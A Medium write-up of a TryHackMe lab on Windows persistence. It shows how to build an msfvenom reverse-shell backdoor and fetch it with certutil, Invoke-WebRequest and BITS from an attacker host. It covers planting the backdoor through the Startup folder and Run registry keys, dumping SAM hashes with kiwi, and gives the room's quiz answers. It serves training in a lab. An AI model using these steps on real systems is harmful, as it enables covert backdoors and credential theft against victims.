::: {}
# Persistence TryHackme Writeup {#persistence-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
Room link: https://tryhackme.com/room/persistence Note: This room is for
Premium Members Only. who purchased THM premium membership.
:::

::::::: {.section .e-content field="body"}
:::::: {#80d5 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Persistence TryHackme Writeup {#11fa .graf .graf--h3 .graf--leading .graf--title name="11fa"}

<figure id="2818" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*b12DdRYqbmBCkVM6.png"
class="graf-image" data-image-id="0*b12DdRYqbmBCkVM6.png"
data-width="570" data-height="130" />
</figure>

**Room link:**
[https://tryhackme.com/room/persistence](https://tryhackme.com/room/persistence){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/persistence"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is for Premium Members Only. who purchased THM premium
membership.**

### What is persistence? {#1a14 .graf .graf--h3 .graf-after--p name="1a14"}

Persistence is a post-exploitation activity used by penetration testers
in order to keep access to a system throughout the whole assessment and
not to have to re-exploit the target even if the system restarts.

It can be considered that there are two types of persistence. These two
types are:

- [Low privileged persistence]{#d8e8}
- [Privileged user persistence]{#2451}

### Low privileged user persistence {#5367 .graf .graf--h3 .graf-after--li name="5367"}

Low privileged persistence means that the penetration tester gained and
uses persistence techniques to keep his access to the target system
under a normal user profile/account (a domain user with no
administrative rights).

### Privileged user persistence {#3753 .graf .graf--h3 .graf-after--p name="3753"}

After gaining access to a system, sometimes (because it would be
inaccurate to say always), a penetration tester will do privilege
escalation in order to gain access to the highest privilege user that
can be on a Windows machine (nt authority\\system).

After privilege escalation, he will use persistence in order to keep the
access he gained.

### Keeping persistence {#a841 .graf .graf--h3 .graf-after--p name="a841"}

Ways of keeping persistence:

- [Startup folder persistence]{#1efd}
- [Editing registry keys]{#34a0}
- [Using scheduled tasks]{#86ed}
- [Using BITS]{#8041}
- [Creating a backdoored service]{#2744}
- [Creating another user]{#a68b}
- [Backdooring RDP]{#c58e}

### Task 2. Low privilege user persistence {#8d70 .graf .graf--h3 .graf-after--li name="8d70"}

Start by deploying the machine and connect to it through RDP using the
following credentials:

**tryhackme:tryhackme123**

I used Remmina to RDP into the machine. If you don't have it installed,
you can install it using the following
command:`sudo apt-get install remmina`{.markup--code .markup--p-code}

<figure id="530d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*SznhmWPMGW1Opmuj.png"
class="graf-image" data-image-id="0*SznhmWPMGW1Opmuj.png"
data-width="875" data-height="347" />
</figure>

Create a Metasploit backdoor using msfvenom. To create the backdoor use
the below syntax:

`msfvenom -p windows/meterpreter/reverse_tcp <LHOST> <LPORT> -f exe > backdoor.exe`{.markup--code
.markup--p-code} where LHOST is your IP and LPORT is he port Metasploit
will listen for connections.

<figure id="c558" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ylSdczju6vQGNlsr.png"
class="graf-image" data-image-id="0*ylSdczju6vQGNlsr.png"
data-width="784" data-height="194" />
</figure>

Create a Metasploit listener.

<figure id="daba" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*n7TLYmMKtOLh65UN.png"
class="graf-image" data-image-id="0*n7TLYmMKtOLh65UN.png"
data-width="760" data-height="291" />
</figure>

Using python create a webserver (python -m SimpleHTTPServer 80) and
deliver (download) the backdoor to the target system you previously
logged in.

### File Transfer method-1 {#4ef8 .graf .graf--h3 .graf-after--p name="4ef8"}

But first, go to Internet Explorer settings and choose "Internet
Options".

<figure id="6106" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*AvyJySZRd8Wk5j32.png"
class="graf-image" data-image-id="0*AvyJySZRd8Wk5j32.png"
data-width="624" data-height="360" />
</figure>

Click on the "Security" tab, select "Trusted Sites" and then click on
the "Sites" button. Fill the "Add this website to the zone" field with
your IP address and click the "Add" button.

<figure id="9705" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Wt-Ca0OWQgz-PJ2h.png"
class="graf-image" data-image-id="0*Wt-Ca0OWQgz-PJ2h.png"
data-width="631" data-height="490" />
</figure>

After adding your IP to the trusted websites you can close that tab, and
then click OK.

Now, you should be able to download your backdoor.

<figure id="90c0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Jz7xaflkvl_ANwdx.png"
class="graf-image" data-image-id="0*Jz7xaflkvl_ANwdx.png"
data-width="622" data-height="435" />
</figure>

By pressing on the "Run" button the backdoor will be executed by the
system and a connection to Metasploit will be created.

### File Transfer method-2 {#5d9d .graf .graf--h3 .graf-after--p name="5d9d"}

Another delivery method would be using Powershell. Open a Powershell
window and download the backdoor using the following command:

``` {#d41e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
Invoke-WebRequest http://10.x.x.x/backdoor.exe -Outfile backdoor.exe
```

<figure id="02f1" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*_5FfWyeQH78xde9Y.png"
class="graf-image" data-image-id="0*_5FfWyeQH78xde9Y.png"
data-width="639" data-height="244" />
</figure>

To execute the backdoor type `.\backdoor.exe`{.markup--code
.markup--p-code}

### File Transfer method-3 {#be9e .graf .graf--h3 .graf-after--p name="be9e"}

You can use certutil to download the backdoor. You can use certutil from
both windows command line and Powershell commandline. The command to
download the file is:

``` {#ddfa .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
certutil -urlcache -split -f http://10.x.x.x/backdoor.exe
```

<figure id="ac3b" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*UOr_7EMjEWEiOuPf.png"
class="graf-image" data-image-id="0*UOr_7EMjEWEiOuPf.png"
data-width="610" data-height="261" />
</figure>

Execution of the backdoor is done in the same way as the one at method
II, by typing `.\backdoor.exe`{.markup--code .markup--p-code}

<figure id="5bce" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*_GHB9UqPke03r1BH.png"
class="graf-image" data-image-id="0*_GHB9UqPke03r1BH.png"
data-width="782" data-height="196" />
</figure>

This is a low privileged user account with no administrative privileges.

### Startup folder persistence {#a98c .graf .graf--h3 .graf-after--p name="a98c"}

Supposing we do not consider privilege escalation is necessary and we
just want to have access to the system in case the user restarts the
machine the simplest method would be moving the backdoor to the startup
folder.

The path of the startup folder is:
`C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`{.markup--code
.markup--p-code}. %username% in our case is tryhackme. Browse to that
path and upload the binary you generated with msfvenom.

<figure id="c566" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*duwfyXOnA1YMDiBm.png"
class="graf-image" data-image-id="0*duwfyXOnA1YMDiBm.png"
data-width="795" data-height="151" />
</figure>

Since the binary is in the startup folder every time a user restarts its
computer and logs in the backdoor will be executed and Metasploit will
receive the connection.

### Editing registries {#f111 .graf .graf--h3 .graf-after--p name="f111"}

Depending on the registries a low privileged user might be able to edit
them. With this in mind, an attacker could edit the registries to
achieve persistence.

An example of an editable registry is:
`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`{.markup--code
.markup--p-code}

First, let's move the backdoor to the AppData folder. You can either
move it from the Startup folder or upload it again to the AppData
folder.

<figure id="e55d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*4J_rUQXQg_SaoMR4.png"
class="graf-image" data-image-id="0*4J_rUQXQg_SaoMR4.png"
data-width="797" data-height="211" />
</figure>

Drop into a shell and use the `reg add`{.markup--code .markup--p-code}
function to create a registry that will run our backdoor as follows:

``` {#5add .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Users\tryhackme\AppData\Roaming\backdoor.exe"
```

<figure id="bcf1" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*5mYTnJRcAGUWMy7S.png"
class="graf-image" data-image-id="0*5mYTnJRcAGUWMy7S.png"
data-width="875" data-height="203" />
</figure>

Notice that the operation was completed successfully.

### BITS Jobs {#7420 .graf .graf--h3 .graf-after--p name="7420"}

BITS (Background Intelligent Transfer Service) is used for file transfer
between machines (downloading or uploading) using idle network
bandwidth.

BITS Jobs are containers that contain files that need to be transferred.
However, when creating the job the container is empty and it needs to be
populated (specify one or more files to be transferred). It's also
needed to add the source and the destination.

Now that we know what BITS is and what jobs are used for let's try
achieving persistence.

You can view the BITS help menu by typing: `bitsadmin `{.markup--code
.markup--p-code}in the command line/the shell you spawned.

Let's create the job:

``` {#aa72 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
bitsadmin /create backdoor
```

<figure id="5e99" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*7Fie08jd4fnBfGms.png"
class="graf-image" data-image-id="0*7Fie08jd4fnBfGms.png"
data-width="803" data-height="337" />
</figure>

Add the file for the job that will be transferred:

``` {#3e50 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
bitsadmin /addfile backdoor "http://10.2.12.26/backdoor.exe" "C:\Users\tryhackme\Documents\backdoor.exe"
```

<figure id="7939" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*62Ml8H_cWA14mYmY.png"
class="graf-image" data-image-id="0*62Ml8H_cWA14mYmY.png"
data-width="875" data-height="209" />
</figure>

Now, let's make BITS execute our backdoor:

``` {#3181 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="swift"}
bitsadmin /SetNotifyCmdLine 1 cmd.exe "/c bitsadmin.exe /complete backdoor | start /B C:\Users\tryhackme\Documents\backdoor.exe"
```

<figure id="5419" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*b0EdDzQsFXuiM89V.png"
class="graf-image" data-image-id="0*b0EdDzQsFXuiM89V.png"
data-width="875" data-height="197" />
</figure>

NULL is used at the end of the syntax because our backdoor doesn't have
any additional parameters.

Since we want our backdoor to be persistent we'll set a retry delay for
the job.

<figure id="f55d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*yqosYLUn1sGyrSd8.png"
class="graf-image" data-image-id="0*yqosYLUn1sGyrSd8.png"
data-width="772" data-height="295" />
</figure>

Finally, we'll start/resume the job.

**Note: In order to work you have to have a webserver (i used apache)
running so BITS can download the backdoor and Metasploit listening for
connections.**

To execute the job type: `bitsadmin /resume`{.markup--code
.markup--p-code}. As can be observed in the below image we received the
second connection.

<figure id="b32a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*upcjH-13nSlRdOBe.png"
class="graf-image" data-image-id="0*upcjH-13nSlRdOBe.png"
data-width="875" data-height="289" />
</figure>

**Note: BITS is very unstable and can and might give you just temporary
persistence.**

**Question** What kind of persistence can/might BITS give?

> ***Answer: temporary***

### What is hash dumping? {#f6ad .graf .graf--h3 .graf-after--blockquote name="f6ad"}

Hash dumping is the technique used by penetration testers to extract the
password hashes off of the target system to either crack them or to try
to do lateral movement.

The simplest way to do hash dumping is by using Metasploit's
hashdump/kiwi module:

<figure id="ea9e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*uXhQ31qvqAEMgNnN.png"
class="graf-image" data-image-id="0*uXhQ31qvqAEMgNnN.png"
data-width="701" data-height="396" />
</figure>

The same result can be achieved by saving the SAM and SYSTEM registries,
downloading the files and using samdump2.

Let's save first the registries on the target machine:

<figure id="db5d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*OUtGSgDtGTNasZGp.png"
class="graf-image" data-image-id="0*OUtGSgDtGTNasZGp.png"
data-width="721" data-height="127" />
</figure>

With the registries saved download the files to the attacker machine and
use samdump2 to recover the hashes.

<figure id="974c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Qe4ryaMEXgboktdM.png"
class="graf-image" data-image-id="0*Qe4ryaMEXgboktdM.png"
data-width="716" data-height="647" />
</figure>

It seems some users do not appear, only their hashes. However, for that
issue, you can query for users that are on the system.

You can dump credentials using kiwi, which is the equivalent of
mimikatz. To do that you'll need to load the module:
`load kiwi.`{.markup--code .markup--p-code}

The command used to dump the SAM database hashes is:
`lsa_dump_sam`{.markup--code .markup--p-code}

<figure id="adba" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*7af_vymsj1Q8KJ_V.png"
class="graf-image" data-image-id="0*7af_vymsj1Q8KJ_V.png"
data-width="600" data-height="703" />
</figure>

There are more ways of dumping hashes and multiple tools and scripts
that can be used for this purpose.

Note: If planning to use the offline cracking method the passwords are
contained in the following wordlist from seclists:
100k-most-used-passwords-NCSC.txt
(/usr/share/seclists/Passwords/Common-Credentials). In case you do not
have seclists installed you can do it by usingthe following command:
`sudo apt-get install seclists .`{.markup--code .markup--p-code}

**Question **.What's Chris decrypted NTLM?

``` {#c31f .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
878d8014606cda29677a44efa1353fc7
```

<figure id="5752" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*kolFwsiLEtZuwjgo.png"
class="graf-image" data-image-id="0*kolFwsiLEtZuwjgo.png"
data-width="875" data-height="305" />
</figure>

[https://crackstation.net/](https://crackstation.net/){.markup--anchor
.markup--p-anchor data-href="https://crackstation.net/"
rel="noopener ugc nofollow noopener" target="_blank"}

> ***Answer: secret***

**Question .**What's Joe decrypted NTLM?

``` {#d813 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
e0b6050c7280bf4a7bee599cf374fd80
```

<figure id="d7e3" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*ZhMN5xWRmuEIe19K.png"
class="graf-image" data-image-id="0*ZhMN5xWRmuEIe19K.png"
data-width="875" data-height="299" />
</figure>

> ***Answer: mypass123***

### Promote and Collaborate on Cybersecurity Insights {#1c3d .graf .graf--h3 .graf-after--blockquote name="1c3d"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#5ded .graf .graf--h3 .graf-after--p name="5ded"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [September 1, 2024](https://medium.com/p/276165b948ec).

[Canonical
link](https://medium.com/@bevijaygupta/persistence-tryhackme-writeup-276165b948ec){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
